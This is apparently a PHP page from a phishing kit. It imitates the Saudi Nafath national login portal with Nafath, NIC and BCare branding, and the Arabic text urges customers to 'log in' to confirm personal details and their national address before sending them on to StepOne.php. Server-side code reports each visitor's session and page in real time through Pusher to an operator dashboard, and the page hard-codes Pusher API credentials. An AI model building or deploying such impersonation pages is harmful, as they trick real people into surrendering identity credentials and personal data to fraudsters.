<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'نفاذ (بداية)');
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'نفاذ (بداية)']);
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الدخول عبر النفاذ الوطني الموحد</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-nafad: #11998E;
            --bg-light: #f8fafc;
        }
        * { padding: 0; margin: 0; box-sizing: border-box; font-family: "Cairo", serif; }
        body { background-color: var(--primary-nafad); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        
        .intro-card {
            background: white;
            border-radius: 30px;
            padding: 50px 40px;
            box-shadow: 0 25px 60px rgba(0,0,0,0.2);
            max-width: 550px;
            width: 100%;
            text-align: center;
            margin: 20px;
            animation: slideUp 0.6s cubic-bezier(0.165, 0.84, 0.44, 1);
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .nafad-logo-large {
            height: 80px;
            margin-bottom: 30px;
            object-fit: contain;
        }

        .trust-divider {
            height: 2px;
            background: linear-gradient(to right, transparent, #e2e8f0, transparent);
            margin: 30px 0;
        }

        .btn-continue {
            background: var(--primary-nafad);
            color: white;
            height: 60px;
            border-radius: 15px;
            font-weight: 900;
            font-size: 1.2rem;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            transition: all 0.3s;
            border: none;
            width: 100%;
        }

        .btn-continue:hover {
            background: #0d7e76;
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
            color: white;
        }

        .info-text {
            color: #64748b;
            line-height: 1.8;
            font-size: 1rem;
        }
    </style>
</head>
<body>

    <div class="container d-flex justify-content-center">
        <div class="intro-card">
            <img src="./assets/nafad.png" alt="Nafath" class="nafad-logo-large">
            
            <h3 class="fw-900 mb-4" style="color: var(--primary-nafad);">المصادقة عبر النفاذ الوطني</h3>
            
            <div class="info-text mb-4">
                <p class="mb-3">عملاءنا الأعزاء،</p>
                <p>يرجى تسجيل الدخول عبر منصة النفاذ الوطني الموحد لتأكيد معلوماتك الشخصية وعنوانك الوطني، وذلك للاستفادة الكاملة من الخدمات الإلكترونية المقدمة من شركة <strong>بي كير</strong>.</p>
            </div>

            <div class="trust-divider"></div>

            <div class="d-flex align-items-center justify-content-center gap-3 mb-5 overflow-hidden">
                <img src="./assets/Untitled.avif" width="160" style="opacity: 0.8;">
                <img src="./assets/NIC.png" width="80" style="opacity: 0.6;">
            </div>

            <a href="./StepOne.php" class="btn-continue">
                متابعة عبر نفاذ <i class="bi bi-arrow-left ms-2"></i>
            </a>
            
            <p class="mt-4 small text-muted">سيتم توجيهك إلى بوابة التصديق الحكومية الموحدة</p>
        </div>
    </div>

    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        var userIdFromSession = <?= json_encode($_SESSION['user_id']); ?>;
    </script>
    <?php include 'chat_widget.php'; ?>
</body>
</html>
